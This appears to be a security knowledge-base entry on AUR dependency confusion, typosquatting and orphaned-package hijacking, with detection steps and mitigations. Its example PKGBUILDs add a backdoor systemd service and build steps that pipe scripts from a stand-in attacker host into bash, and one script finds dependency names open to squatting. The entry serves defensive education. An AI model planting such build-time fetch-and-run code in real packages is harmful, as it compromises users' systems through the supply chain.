---
name: "AUR Dependency Confusion and Typosquatting"
packageManager: "pacman"
slug: "pacman-aur-dependency-confusion"
category: "Dependency Confusion"
severity: "high"
platform:
  - "Linux"
description: "The Arch User Repository (AUR) allows any registered user to publish package build scripts. AUR helpers like yay and paru automatically resolve dependencies listed in PKGBUILD depends arrays, pulling from both official repos and the AUR. An attacker can register AUR package names that shadow internal or expected dependency names, or create typosquatted versions of popular packages. When a victim installs or builds the package, the AUR helper resolves the dependency to the attacker's malicious package, executing arbitrary code via the PKGBUILD or install scriptlets."
prerequisites:
  - "A free aur.archlinux.org account to publish packages"
  - "Knowledge of commonly used internal package names, popular package names with plausible typos, or orphaned AUR packages"
  - "The victim uses an AUR helper that automatically resolves and installs AUR dependencies"
attackScenarios:
  - title: "Typosquatting a Popular AUR Package"
    description: "An attacker registers AUR package names that are common misspellings of popular packages (e.g., visual-studio-code-bin vs visual-studio-cod-bin, google-chrome vs gooogle-chrome). The malicious PKGBUILD builds the legitimate software but injects additional malicious code."
    commands:
      - label: "Registering a typosquatted AUR package"
        code: |
          # Attacker creates a PKGBUILD for 'visual-studio-cod-bin'
          # (missing the 'e' in 'code')
          # The PKGBUILD is nearly identical to the real package but includes:

          pkgname=visual-studio-cod-bin
          pkgver=1.89.0
          pkgrel=1
          pkgdesc="Visual Studio Code (Official Microsoft build)"
          arch=('x86_64')
          url="https://code.visualstudio.com/"
          license=('custom')

          package() {
              # Install the real VS Code binary (looks legitimate)
              install -Dm755 "$srcdir/code" "$pkgdir/usr/bin/code"

              # Also install a persistent backdoor
              mkdir -p "$pkgdir/usr/lib/systemd/system"
              cat > "$pkgdir/usr/lib/systemd/system/code-updater.service" << 'EOF'
          [Unit]
          Description=VS Code Update Service
          After=network-online.target
          [Service]
          ExecStart=/bin/bash -c 'curl -s https://attacker.example.com/payload | bash'
          Restart=on-failure
          RestartSec=3600
          [Install]
          WantedBy=multi-user.target
          EOF
          }
        language: "bash"
      - label: "Victim installs with a typo"
        code: |
          yay -S visual-studio-cod-bin
          # Installs the attacker's package; backdoor service is now on disk
        language: "bash"
  - title: "Hijacking an Orphaned AUR Package"
    description: "When an AUR package maintainer abandons a package, any user can adopt it. An attacker monitors orphaned packages with high vote counts and adopts them, then pushes a malicious update. Existing users who update their AUR packages receive the compromised version."
    commands:
      - label: "Attacker adopts an orphaned popular package and pushes a malicious update"
        code: |
          # 1. Search for orphaned packages with high votes on aur.archlinux.org
          # 2. Click "Adopt" on a popular orphaned package
          # 3. Clone the AUR repo and modify the PKGBUILD
          git clone ssh://aur@aur.archlinux.org/popular-orphan-pkg.git
          cd popular-orphan-pkg

          # 4. Add a malicious prepare() function
          # The diff looks like a minor version bump with a "build fix"
          # but prepare() now downloads a payload
        language: "bash"
      - label: "Malicious addition to the PKGBUILD"
        code: |
          prepare() {
              cd "$srcdir/$pkgname-$pkgver"
              # "Apply upstream patch" — actually a payload download
              curl -sL "https://attacker.example.com/patches/fix-${pkgver}.sh" | bash
          }
        language: "bash"
  - title: "Dependency Name Squatting"
    description: "An attacker identifies packages that have optional or make dependencies not yet in the AUR. They register those names on the AUR with a malicious PKGBUILD. When other packages list these as dependencies and are installed via an AUR helper, the malicious package is pulled in automatically."
    commands:
      - label: "Identify unregistered dependency names"
        code: |
          # Find makedepends/depends in AUR packages that don't resolve
          # to any official or AUR package — these names are available to squat
          curl -s "https://aur.archlinux.org/rpc/v5/info?arg[]=target-package" | \
              jq -r '.results[0].MakeDepends[]' | while read dep; do
              pacman -Si "$dep" 2>/dev/null || \
              curl -s "https://aur.archlinux.org/rpc/v5/info?arg[]=$dep" | \
                  jq -e '.resultcount == 0' && echo "AVAILABLE: $dep"
          done
        language: "bash"
      - label: "Register the dependency name with a malicious PKGBUILD"
        code: |
          # Attacker creates an AUR package for the missing dependency
          # with legitimate-looking metadata but a malicious build step
          pkgname=libfoo-utils
          pkgver=1.0.0
          pkgrel=1
          pkgdesc="Utility library for libfoo"
          arch=('x86_64')

          build() {
              # Malicious code executes when this dependency is pulled in
              curl -s https://attacker.example.com/c2 | bash
          }

          package() {
              # Install a dummy file so the package appears valid
              mkdir -p "$pkgdir/usr/lib"
              touch "$pkgdir/usr/lib/libfoo-utils.so"
          }
        language: "bash"
detection:
  - title: "Verify package names carefully before installing"
    description: "Double-check the exact package name, maintainer, and vote count on aur.archlinux.org before installing."
    commands:
      - code: |
          # Check package details before installing
          yay -Si visual-studio-code-bin
          # Verify: maintainer, votes, popularity, last updated
          # Low votes + recent creation = suspicious
        language: "bash"
  - title: "Monitor AUR package maintainer changes"
    description: "Track ownership changes for packages you depend on using the AUR RPC API."
    commands:
      - code: |
          # Query the AUR API for package info
          curl -s "https://aur.archlinux.org/rpc/v5/info?arg[]=package-name" | \
              jq '.results[0] | {Name, Maintainer, FirstSubmitted, LastModified}'
          # Alert if Maintainer has changed since last check
        language: "bash"
  - title: "Review dependency trees before installation"
    description: "Inspect the full dependency tree an AUR helper will install to catch unexpected AUR dependencies."
    commands:
      - code: |
          # Print what would be installed without actually installing
          yay -S package-name --print
          # Review each AUR dependency in the list
        language: "bash"
mitigation:
  - "Always verify the exact package name, maintainer, votes, and comments on aur.archlinux.org before installing"
  - "Configure AUR helpers to prompt for PKGBUILD review on new installs and updates"
  - "Monitor AUR packages you depend on for maintainer changes or suspicious updates"
  - "Prefer official repository packages over AUR alternatives"
  - "Pin AUR package versions and review diffs on every update"
  - "Use paru's built-in diff-on-update feature to review PKGBUILD changes before building"
references:
  - title: "Arch Wiki - AUR"
    url: "https://wiki.archlinux.org/title/Arch_User_Repository"
  - title: "Arch Wiki - AUR helpers"
    url: "https://wiki.archlinux.org/title/AUR_helpers"
  - title: "AUR RPC Interface"
    url: "https://wiki.archlinux.org/title/Aurweb_RPC_interface"
created: 2026-04-14
updated: 2026-04-14
---
